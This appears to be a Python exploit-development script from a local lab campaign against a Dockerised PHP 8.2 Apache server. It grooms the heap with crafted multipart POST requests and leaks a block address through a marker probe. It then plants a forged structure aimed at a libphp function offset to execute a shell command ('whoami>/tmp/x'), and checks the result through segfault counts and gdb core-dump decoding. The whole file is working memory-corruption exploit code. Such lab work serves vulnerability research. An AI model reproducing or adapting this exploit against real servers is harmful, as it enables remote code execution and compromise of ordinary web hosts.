#!/usr/bin/env python3
"""oom119c: HEAP-RESIDENT ARM v2 — deterministic-reuse aiming.

Laws tonight (oom119b): small (64B) values are heap-resident and
probe-visible (markers found), but strides are irregular -> old
C0+3584*PART law dead. New aiming: warm-heap determinism (98-era
measured slab reuse): a probe post BYTE-SIZE-IDENTICAL to the armed
post allocates at the same addresses. Marker placed at exactly OFF
inside part 13's 256B value -> measured marker address = B = block
address in the armed post (same request family; fired post's own
part-13 value reallocs there and its teardown walks it).

Boot sequence: recreate(core=-1) -> shape(98-era) -> for OFF in legal
candidates: probe post (values 0x02-safe, part13 256B marker@OFF) ->
B=hit -> legality(nib8/bit8/bit9) -> pass: ARMED fire (others 64B
cell_of(B); part13 run+block@OFF) -> segv/core/rdi//tmp/x/probe.
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8081"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF = 0x39B8A0
CMD = b"whoami>/tmp/x"
VMARK = b"QMARK7XY" * 3            # 24B
SKIP16 = b"\x02" * 16              # IS_NULL quiet-skip cell
STRIDE = 3584
PART = 13
BLK = 0xB8
K1 = 4200
NCELL = 4                          # 64B values
V256 = 16                          # part 13: 256B


def get(url, timeout=60):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(65536).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def probe_scan(needle, chunk=262144, maxc=8):
    for attempt in range(6):
        code, out = get("%s/oom_probe.php?h=%s&chunk=%d&maxc=%d"
                        % (HOST, needle.hex(), chunk, maxc))
        if code == 200 and out.strip() and "Fatal" not in out \
                and out.strip() not in ("bad", "ERR open"):
            offs = []
            for line in out.splitlines():
                line = line.strip()
                if not line.startswith("R="):
                    continue
                m = re.search(r"d=((?:0x)?[0-9a-f]+(?: (?:0x)?[0-9a-f]+)*)", line)
                if m:
                    for tok in m.group(1).split():
                        v = int(tok, 16)
                        if v > 0x10000:
                            offs.append(v)
            if offs:
                return offs
        time.sleep(0.7)
    return []


def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None


def sh(cmd, timeout=60):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()


def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))


def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8081:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False


def post_mod(body, timeout=240):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__


def decode_core(tag):
    host_copy = "/tmp/core119c_%s" % tag
    c1 = subprocess.run(["docker", "cp", "php_vuln:/tmp/core", host_copy], capture_output=True)
    if c1.returncode != 0:
        return None
    subprocess.run(["docker", "cp", host_copy, "phpbuild:/tmp/core.119c_%s" % tag], capture_output=True)
    open("/tmp/g119c.gdb", "w").write("set pagination off\nset confirm off\nbt 3\ninfo registers rdi rip\nquit\n")
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                        "gdb -q -batch -x /tmp/g119c.gdb /tmp/libphp.stock.so /tmp/core.119c_%s 2>&1 | grep -E '^rdi|^rip'" % tag],
                       capture_output=True, timeout=120)
    m = re.search(r"rdi\s+(0x[0-9a-f]+)", r.stdout.decode("latin1"))
    return m.group(1) if m else "?"


def cell_of(addr):
    return struct.pack("<Q", addr) * 2


def part13_value_256(marker=False, B=None, OFF=0):
    """256B: run cells up to OFF; at OFF: 24B marker (probe) or 184B block + run (armed)."""
    t = bytearray(SKIP16 * V256) if marker else bytearray(cell_of(B) * V256)
    if marker:
        t[OFF:OFF + 24] = VMARK
    else:
        st = struct.pack_into
        st("<II", t, OFF + 0x00, 1, 0x108)
        st("<II", t, OFF + 0x08, 1, 0)
        st("<Q", t, OFF + 0x10, 0)
        st("<Q", t, OFF + 0x18, B + 0x68)
        st("<I", t, OFF + 0x2C, 1)
        st("<Q", t, OFF + 0x50, B + 0x90)
        t[OFF + 0x58] = 6
        st("<I", t, OFF + 0x5C, 0x106)
        st("<Q", t, OFF + 0x68, 0)
        st("<Q", t, OFF + 0x70, BASE + ZIF)
        st("<IIQI", t, OFF + 0x90, 1, 0x106, 0, len(CMD))
        t[OFF + 0xA8: OFF + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
        # re-lay run cells that the block overwrote (keep self-typing density)
        for s in range(0, 256, 16):
            if s + 16 <= 256 and not (OFF <= s < OFF + BLK):
                t[s:s + 16] = cell_of(B)
    return bytes(t)


def build_body(part13_val):
    """Names 0x02-skip everywhere (incl poison-free); others 64B SKIP16/B run."""
    ps = []
    for i in range(K1):
        head = (b'--BOUND\r\nContent-Disposition: form-data; name="'
                + SKIP16 * 190 + b"%d" % i + b'[x]"\r\n\r\n')
        val = part13_val if i == PART else (SKIP16 * NCELL if isinstance(part13_val, bytes) and part13_val is None else None)
        ps.append(head + val + b"\r\n") if val is not None else None
    # rebuild cleanly:
    ps = []
    for i in range(K1):
        head = (b'--BOUND\r\nContent-Disposition: form-data; name="'
                + SKIP16 * 190 + b"%d" % i + b'[x]"\r\n\r\n')
        val = part13_val if i == PART else OTHER_VAL[0]
        ps.append(head + val + b"\r\n")
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


OTHER_VAL = [SKIP16 * NCELL]   # 64B; armed swaps to cell_of(B)


print("=== oom119c: deterministic-reuse arm ===", flush=True)
assert recreate(), "recreate failed"
md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
print("md5=%s" % md5[:8], flush=True)
assert md5 == STOCK_MD5, "not stock"

n0 = segv_count()
for k1 in P.K1S[:-1]:
    c, _r = post_mod(P.build_attack(k1, 5000000))
print("shape done segv+%d" % (segv_count() - n0), flush=True)
BASE = base_now()
print("base=0x%x" % BASE, flush=True)

# OFF candidates: block fits 256B; B legal (nib8=8, bit8=1, bit9=0)
CANDS = [off for off in range(8, V256 * 16 - BLK - 1, 16)]
B = OFF = None
for off in CANDS:
    pbody = build_body(part13_value_256(marker=True, OFF=off))
    c, _r = post_mod(pbody)
    offs = probe_scan(VMARK)
    if not offs:
        print("off=0x%x: no marker" % off, flush=True)
        continue
    cand = offs[0]
    ok = (cand & 0xF == 8 and (cand >> 8) & 1 == 1 and (cand >> 9) & 1 == 0)
    print("off=0x%x probe: B=0x%x legal=%s hits=%d" % (off, cand, ok, len(offs)), flush=True)
    if ok:
        B, OFF = cand, off
        break
assert B, "no legal B measured"
print("B=0x%x OFF=0x%x nib8=%d bit8=%d bit9=%d"
      % (B, OFF, B & 0xF, (B >> 8) & 1, (B >> 9) & 1), flush=True)

OTHER_VAL[0] = cell_of(B)
abody = build_body(part13_value_256(B=B, OFF=OFF))
print("armed body %.2f MB" % (len(abody) / 1048576.0), flush=True)
for rep in range(3):
    n0 = segv_count()
    c, r = post_mod(abody)
    time.sleep(2)
    d = segv_count() - n0
    core = sh("test -f /tmp/core && echo y") == "y"
    xf = sh("cat /tmp/x 2>&1")
    rdi = decode_core("f%d" % rep) if core else "-"
    print("fire%d: %s segv+%d core=%s rdi=%s x=%s"
          % (rep, c, d, core, rdi, xf[:40]), flush=True)
    if "/tmp/x" in xf:
        print("!!! /tmp/x EXISTS - CAMPAIGN WON", flush=True)
        break
    if core:
        sh("mv /tmp/core /tmp/core.used 2>/dev/null")

# post-mortem probe: did armed values survive / where did markers go?
offs2 = probe_scan(VMARK)
print("post marker probe: %s" % (["0x%x" % o for o in offs2[:3]] or "none"), flush=True)
print("=== done ===", flush=True)
